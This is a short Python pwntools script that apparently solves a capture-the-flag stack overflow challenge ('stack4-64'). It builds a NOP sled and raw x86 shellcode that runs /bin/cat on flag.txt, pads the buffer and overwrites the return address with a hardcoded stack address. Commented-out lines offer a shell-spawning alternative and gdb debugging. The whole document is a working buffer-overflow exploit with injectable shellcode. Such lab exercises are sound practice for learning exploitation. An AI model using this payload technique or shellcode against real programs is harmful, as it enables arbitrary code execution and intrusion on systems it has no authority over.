from pwn import *

shellcode  = 1000*shellcraft.nop()
shellcode = asm(shellcode)
#shellcode += shellcraft.trap()
#shellcode += shellcraft.cat("flag.txt")
#shellcode += shellcraft.exit(0)
#shellcode += shellcraft.trap()
#shellcode += shellcraft.sh()
shellcode += b"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80"
payload =  68*b"A"
payload += p32(0xffffd560)
payload += 50*p32(0xffffd700)
payload += shellcode

sys.stdout.buffer.write(payload)

#p = process("./stack4-64")

#gdb.attach(p,"""
#    break *main
#        """)
#p.sendline(payload)
#p.interactive()
